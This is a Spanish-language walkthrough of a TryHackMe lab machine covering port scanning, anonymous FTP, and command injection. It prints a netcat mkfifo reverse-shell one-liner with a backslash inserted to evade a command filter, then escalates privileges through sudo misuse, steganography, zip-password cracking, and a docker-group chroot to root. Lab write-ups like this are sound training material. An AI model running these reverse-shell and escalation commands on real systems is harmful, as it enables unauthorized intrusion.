@@ -1,0 +1,355 @@
+I"5a<p>La máquina Overpass es una máquina de TryHackMe en la que mediante la explotación de un servidor web conseguimos tanto la flag del usuario como la de root.</p>
+
+<h1 id="enumeración"><a href="#header-1"></a>Enumeración</h1>
+
+<p>La enumeración se trata de una de las fases principales, en las que recolectamos la máxima información posible de la máquina víctima.</p>
+
+<p>Usaremos nmap para analizar los puertos abiertos:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nv">$IP</span><span class="nt">-VICTIMA</span> <span class="nt">-oG</span> allPorts
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Escaneo todos los puertos abiertos: -p- –open</p>
+  </li>
+  <li>
+    <p>Mediante –min-rate 5000 indicamos que queremos emitir paquetes no más lentos que 5000 paquetes por segundo.</p>
+  </li>
+  <li>
+    <p>Triple verbose (-vvv) para que vaya reportando por consola los puertos abiertos y no tener que esperar al final del escaneo.</p>
+  </li>
+  <li>
+    <p>Para que el escaneo no aplique resolución DNS usamos -n</p>
+  </li>
+  <li>
+    <p>En mi caso exporto los puertos abiertos en formato grepeable (-oG) al archivo allPorts</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>may be slower.
+Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-10-19 13:35 EDT
+Initiating Connect Scan at 13:35
+Scanning 10.10.50.160 <span class="o">[</span>65535 ports]
+Discovered open port 21/tcp on 10.10.50.160
+Discovered open port 22/tcp on 10.10.50.160
+Discovered open port 80/tcp on 10.10.50.160
+Completed Connect Scan at 13:35, 11.25s elapsed <span class="o">(</span>65535 total ports<span class="o">)</span>
+Nmap scan report <span class="k">for </span>10.10.50.160
+Host is up, received user-set <span class="o">(</span>0.045s latency<span class="o">)</span><span class="nb">.</span>
+Scanned at 2022-10-19 13:35:11 EDT <span class="k">for </span>11s
+Not shown: 65532 closed tcp ports <span class="o">(</span>conn-refused<span class="o">)</span>
+PORT   STATE SERVICE REASON
+21/tcp open  ftp     syn-ack
+22/tcp open  ssh     syn-ack
+80/tcp open  http    syn-ack
+
+Read data files from: /usr/bin/../share/nmap
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>11.29 seconds
+</code></pre></div></div>
+
+<p>Puesto que el puerto 80 está abierto, introducimos la IP en nuestro navegador y nos muestra una página de deportes pero no muchas más información. El puerto 21 está abierto por lo que escanearemos la versión y servicio de los puertos abiertos para obtener más información:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-sCV</span> <span class="nt">-p21</span>,22,80 10.10.229.49 <span class="nt">-oN</span> targeted
+Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-10-19 13:51 EDT
+Nmap scan report <span class="k">for </span>10.10.229.49
+Host is up <span class="o">(</span>0.046s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed <span class="o">(</span>FTP code 230<span class="o">)</span>
+|_-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.8.4.179
+|      Logged <span class="k">in </span>as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session <span class="nb">timeout </span><span class="k">in </span>seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 3
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 09:f9:5d:b9:18:d0:b2:3a:82:2d:6e:76:8c:c2:01:44 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 1b:cf:3a:49:8b:1b:20:b0:2c:6a:a5:51:a8:8f:1e:62 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 30:05:cc:52:c6:6f:65:04:86:0f:72:41:c8:a4:39:cf <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  http    Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-title: Game Info
+|_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
+Service Info: OSs: Unix, Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>8.62 seconds
+<span class="o">[</span>1]    2818 segmentation fault  nmap <span class="nt">-sCV</span> <span class="nt">-p21</span>,22,80 10.10.229.49 <span class="nt">-oN</span> targeted
+</code></pre></div></div>
+<p>Podemos entrar mediante ftp con el usuario anonymous y sin contraseña, además de ver un archivo (note.txt). Lo hacemos y vemos un archivo que nos da dos posibles usuarios pero nada más:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ftp 10.10.229.49
+Connected to 10.10.229.49.
+220 <span class="o">(</span>vsFTPd 3.0.3<span class="o">)</span>
+Name <span class="o">(</span>10.10.229.49:jorge<span class="o">)</span>: anonymous
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system <span class="nb">type </span>is UNIX.
+Using binary mode to transfer files.
+ftp&gt; <span class="nb">ls
+</span>229 Entering Extended Passive Mode <span class="o">(||</span>|52273|<span class="o">)</span>
+150 Here comes the directory listing.
+<span class="nt">-rw-r--r--</span>    1 1001     1001           90 Oct 03  2020 note.txt
+226 Directory send OK.
+ftp&gt; less note.txt
+Anouradh Apaar
+</code></pre></div></div>
+
+<p>Usaremos gobuster para obtener directorios ocultos:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://10.10.229.49 <span class="nt">-w</span> /usr/share/wordlists/dirb/common.txt <span class="nt">-t</span> 25 <span class="nt">-x</span> php,html,txt
+<span class="o">===============================================================</span>
+Gobuster v3.1.0
+by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
+<span class="o">===============================================================</span>
+<span class="o">[</span>+] Url:                     http://10.10.229.49
+<span class="o">[</span>+] Method:                  GET
+<span class="o">[</span>+] Threads:                 25
+<span class="o">[</span>+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+<span class="o">[</span>+] Negative Status codes:   404
+<span class="o">[</span>+] User Agent:              gobuster/3.1.0
+<span class="o">[</span>+] Extensions:              php,html,txt
+<span class="o">[</span>+] Timeout:                 10s
+<span class="o">===============================================================</span>
+2022/10/19 13:54:14 Starting gobuster <span class="k">in </span>directory enumeration mode
+<span class="o">===============================================================</span>
+/.htaccess.html       <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]
+/.htpasswd.html       <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]
+/.htpasswd.txt        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]
+/.htpasswd            <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]
+/.htpasswd.php        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]
+/.hta.php             <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]
+/.hta.html            <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]
+/.hta.txt             <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]
+/.hta                 <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]
+/about.html           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 21339]
+/.htaccess.txt        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]  
+/.htaccess            <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]  
+/.htaccess.php        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]  
+/blog.html            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 30279]
+/contact.html         <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 18301]
+/contact.php          <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 0]    
+/css                  <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 310] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.229.49/css/]
+/fonts                <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 312] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.229.49/fonts/]
+/images               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 313] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.229.49/images/]
+/index.html           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 35184]                                
+/index.html           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 35184]                                
+/js                   <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 309] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.229.49/js/]    
+/news.html            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 19718]                                
+/secret               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 313] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.229.49/secret/]
+/server-status        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]                                  
+/team.html            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 19868]                                
+                                                                                 
+<span class="o">===============================================================</span>
+2022/10/19 13:54:55 Finished
+<span class="o">===============================================================</span>
+</code></pre></div></div>
+
+<p>Encontramos directorios ocultos y tras observarlos todos el más interesante es /secret</p>
+
+<p>Nos metemos y podemos listar comandos.</p>
+
+<h1 id="acceso-al-sistema"><a href="#header-1"></a>Acceso al sistema</h1>
+
+<p>Intentamos ejecutar una reverse shell pero no nos deja de forma directa. Desde la web de <a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">Pentest Monkey</a> usaremos la de Netcat ya que añadiendo \ entre la r y la m al principio de la reverse shell si que se lleva a cabo:</p>
+
+<blockquote>
+  <table>
+    <tbody>
+      <tr>
+        <td>r\m /tmp/f;mkfifo /tmp/f;cat /tmp/f</td>
+        <td>/bin/sh -i 2&gt;&amp;1</td>
+        <td>nc 10.0.0.1 1234 &gt;/tmp/f</td>
+      </tr>
+    </tbody>
+  </table>
+</blockquote>
+
+<p>Mientras tanto desde nuestro equipo nos ponemos en escucha por el puerto indicado en la reverse shell:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-lnvp</span> 8080
+listening on <span class="o">[</span>any] 8080 ...
+connect to <span class="o">[</span>10.8.4.179] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.229.49] 45636
+/bin/sh: 0: can<span class="s1">'t access tty; job control turned off
+$
+</span></code></pre></div></div>
+
+<p>Listamos el contenido del usuario apaar pero siendo www-data no podemos hacer gran cosa. Sin embargo me fijo en el archivo .helpline.sh</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cd </span>apaar
+<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
+total 44
+drwxr-xr-x 5 apaar apaar 4096 Oct  4  2020 <span class="nb">.</span>
+drwxr-xr-x 5 root  root  4096 Oct  3  2020 ..
+<span class="nt">-rw-------</span> 1 apaar apaar    0 Oct  4  2020 .bash_history
+<span class="nt">-rw-r--r--</span> 1 apaar apaar  220 Oct  3  2020 .bash_logout
+<span class="nt">-rw-r--r--</span> 1 apaar apaar 3771 Oct  3  2020 .bashrc
+drwx------ 2 apaar apaar 4096 Oct  3  2020 .cache
+drwx------ 3 apaar apaar 4096 Oct  3  2020 .gnupg
+<span class="nt">-rwxrwxr-x</span> 1 apaar apaar  286 Oct  4  2020 .helpline.sh
+<span class="nt">-rw-r--r--</span> 1 apaar apaar  807 Oct  3  2020 .profile
+drwxr-xr-x 2 apaar apaar 4096 Oct  3  2020 .ssh
+<span class="nt">-rw-------</span> 1 apaar apaar  817 Oct  3  2020 .viminfo
+<span class="nt">-rw-rw----</span> 1 apaar apaar   46 Oct  4  2020 local.txt
+</code></pre></div></div>
+
+<p>Hago sudo -l para ver los comandos que puedo ejecutar como root:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+Matching Defaults entries <span class="k">for </span>www-data on ubuntu:
+    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+
+User www-data may run the following commands on ubuntu:
+    <span class="o">(</span>apaar : ALL<span class="o">)</span> NOPASSWD: /home/apaar/.helpline.sh
+</code></pre></div></div>
+<p>Puedo ejecutar el archivo como usuario apaar, lo llevo a cabo y nos hace dos preguntas. Lo primero que se me viene a la cabeza es ejecutar una bash (/bin/bash), parece ser que funciona:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-u</span> apaar /home/apaar/.helpline.sh
+
+Welcome to helpdesk. Feel free to talk to anyone at any <span class="nb">time</span><span class="o">!</span>
+
+/bin/bash     
+/bin/bash
+<span class="nb">id 
+</span><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>apaar<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>apaar<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>apaar<span class="o">)</span>
+<span class="nb">ls
+</span>local.txt
+<span class="nb">cat </span>local.txt
+<span class="o">{</span>USER-FLAG: ????????????????????<span class="o">}</span>
+</code></pre></div></div>
+
+<p>Obtenemos así la flag del usuario</p>
+
+<p>Desde este punto no podemos hacer mucho más por lo que volvemos al directorio /var/www que es en el que por norma general se encuentran los contenidos interesantes de las explotaciones web.</p>
+
+<p>En este punto listamos el contenido de alguno de los archivos y conseguimos información sobre una imagen. En hacker.php vemos:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;center&gt;
+        &lt;img src <span class="o">=</span> <span class="s2">"images/hacker-with-laptop_23-2147985341.jpg"</span><span class="o">&gt;</span>&lt;br&gt;
+        &lt;h1 <span class="nv">style</span><span class="o">=</span><span class="s2">"background-color:red;"</span><span class="o">&gt;</span>You have reached this far. &lt;/h2&gt;
+        &lt;h1 <span class="nv">style</span><span class="o">=</span><span class="s2">"background-color:black;"</span><span class="o">&gt;</span>Look <span class="k">in </span>the dark! You will find your
+ answer&lt;/h1&gt;
+</code></pre></div></div>
+
+<p>Vamos entonces a descargarnos la imagen. Nos creamos un servidor con:</p>
+
+<blockquote>
+  <p>python3 -m http.server 8000</p>
+</blockquote>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-m</span> http.server 8000
+Serving HTTP on 0.0.0.0 port 8000 <span class="o">(</span>http://0.0.0.0:8000/<span class="o">)</span> ...
+10.8.4.179 - - <span class="o">[</span>19/Oct/2022 18:34:39] <span class="s2">"GET / HTTP/1.1"</span> 200 -
+10.8.4.179 - - <span class="o">[</span>19/Oct/2022 18:34:39] code 404, message File not found
+10.8.4.179 - - <span class="o">[</span>19/Oct/2022 18:34:39] <span class="s2">"GET /favicon.ico HTTP/1.1"</span> 404 -
+10.8.4.179 - - <span class="o">[</span>19/Oct/2022 18:34:41] <span class="s2">"GET /hacker-with-laptop_23-2147985341.jpg HTTP/1.1"</span> 200 -
+</code></pre></div></div>
+
+<p>Entramos en la $IP-VICTIMA:8000 y la descargamos.</p>
+
+<p>Con stegseek intentamos extraer la información:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ stegseek hacker-with-laptop_23-2147985341.jpg /home/jorge/Descargas/rockyou.txt
+StegSeek 0.6 - https://github.com/RickdeJager/StegSeek
+
+<span class="o">[</span>i] Found passphrase: <span class="s2">""</span>
+<span class="o">[</span>i] Original filename: <span class="s2">"backup.zip"</span><span class="nb">.</span>
+<span class="o">[</span>i] Extracting to <span class="s2">"hacker-with-laptop_23-2147985341.jpg.out"</span><span class="nb">.</span>
+</code></pre></div></div>
+
+<p>Nos los exporta a un archivo comprimido, lo descomprimimos con 7z:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ 7z x hacker-with-laptop_23-2147985341.jpg.out
+
+7-Zip <span class="o">[</span>64] 16.02 : Copyright <span class="o">(</span>c<span class="o">)</span> 1999-2016 Igor Pavlov : 2016-05-21
+p7zip Version 16.02 <span class="o">(</span><span class="nv">locale</span><span class="o">=</span>es_ES.UTF-8,Utf16<span class="o">=</span>on,HugeFiles<span class="o">=</span>on,64 bits,2 CPUs 11th Gen Intel<span class="o">(</span>R<span class="o">)</span> Core<span class="o">(</span>TM<span class="o">)</span> i5-11400F @ 2.60GHz <span class="o">(</span>A0671<span class="o">)</span>,ASM,AES-NI<span class="o">)</span>
+
+Scanning the drive <span class="k">for </span>archives:
+1 file, 750 bytes <span class="o">(</span>1 KiB<span class="o">)</span>
+
+Extracting archive: hacker-with-laptop_23-2147985341.jpg.out
+<span class="nt">--</span>
+Path <span class="o">=</span> hacker-with-laptop_23-2147985341.jpg.out
+Type <span class="o">=</span> zip
+Physical Size <span class="o">=</span> 750
+
+    
+Enter password <span class="o">(</span>will not be echoed<span class="o">)</span>:
+ERROR: Wrong password : source_code.php
+                      
+Sub items Errors: 1
+
+Archives with Errors: 1
+
+Sub items Errors: 1
+</code></pre></div></div>
+<p>Tiene contraseña, vamos a intentar crackearla con jhon:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ zip2john hacker-with-laptop_23-2147985341.jpg.out <span class="o">&gt;</span> <span class="nb">hash
+</span>ver 2.0 efh 5455 efh 7875 hacker-with-laptop_23-2147985341.jpg.out/source_code.php PKZIP Encr: TS_chk, <span class="nv">cmplen</span><span class="o">=</span>554, <span class="nv">decmplen</span><span class="o">=</span>1211, <span class="nv">crc</span><span class="o">=</span>69DC82F3 <span class="nv">ts</span><span class="o">=</span>2297 <span class="nv">cs</span><span class="o">=</span>2297 <span class="nb">type</span><span class="o">=</span>8
+❯ john <span class="nt">--wordlist</span><span class="o">=</span>/home/jorge/Descargas/rockyou.txt
+Password files required, but none specified
+❯ john <span class="nt">--wordlist</span><span class="o">=</span>/home/jorge/Descargas/rockyou.txt <span class="nb">hash
+</span>Using default input encoding: UTF-8
+Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>PKZIP <span class="o">[</span>32/64]<span class="o">)</span>
+Will run 2 OpenMP threads
+Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
+?????????        <span class="o">(</span>hacker-with-laptop_23-2147985341.jpg.out/source_code.php<span class="o">)</span>     
+1g 0:00:00:00 DONE <span class="o">(</span>2022-10-19 14:47<span class="o">)</span> 33.33g/s 409600p/s 409600c/s 409600C/s toodles..havana
+Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
+Session completed.
+</code></pre></div></div>
+
+<p>La tenemos, descomprimimos ahora el archivo con la contraseña y nos metemos en source_code.php:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span><span class="o">(</span>base64_encode<span class="o">(</span><span class="nv">$password</span><span class="o">)</span> <span class="o">==</span> <span class="s2">"IWQwbnRLbjB3bVlwQHNzdzByZA=="</span><span class="o">)</span>
+</code></pre></div></div>
+<p>Obtenemos una contraseña para el usuario Anurodh en base64. La descodificamos con:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">echo</span> <span class="s2">"IWQwbnRLbjB3bVlwQHNzdzByZA=="</span> | <span class="nb">base64</span> <span class="nt">-d</span>
+<span class="o">!</span>d0ntKn??????
+</code></pre></div></div>
+
+<p>Intentamos entonces logearnos con el usuario anurodh:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>apaar@ubuntu:/home<span class="nv">$ </span>su anurodh
+su anurodh
+Password: <span class="o">!</span>d0ntKn??????
+
+anurodh@ubuntu:/home<span class="err">$</span>
+</code></pre></div></div>
+
+<h1 id="escalada-de-privilegios"><a href="#header-1"></a>Escalada de privilegios</h1>
+
+<p>Lo conseguimos, hacemos id para ver en que grupos estamos. Parece ser que estamos en el grupo docker. Desde <a href="https://gtfobins.github.io/gtfobins/docker/">GTFOBins</a> vemos que con una sola linea de comandos perteneciendo al grupo docker podemos escalar privilegios a root:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>anurodh@ubuntu:/home<span class="nv">$ </span>docker run <span class="nt">-v</span> /:/mnt <span class="nt">--rm</span> <span class="nt">-it</span> alpine <span class="nb">chroot</span> /mnt sh
+docker run <span class="nt">-v</span> /:/mnt <span class="nt">--rm</span> <span class="nt">-it</span> alpine <span class="nb">chroot</span> /mnt sh
+<span class="c"># whoami</span>
+<span class="nb">whoami
+</span>root
+<span class="c"># cd /root</span>
+<span class="nb">cd</span> /root
+<span class="c"># ls</span>
+<span class="nb">ls
+</span>proof.txt
+<span class="c"># cat proof.txt</span>
+<span class="nb">cat </span>proof.txt
+<span class="o">{</span>ROOT-FLAG: ??????????????????????<span class="o">}</span>
+</code></pre></div></div>
+
+<p>Conseguimos la flag de root!</p>
+
+<p>Muchas gracias por leer este writeup, espero que te haya gustado!</p>
+:ET
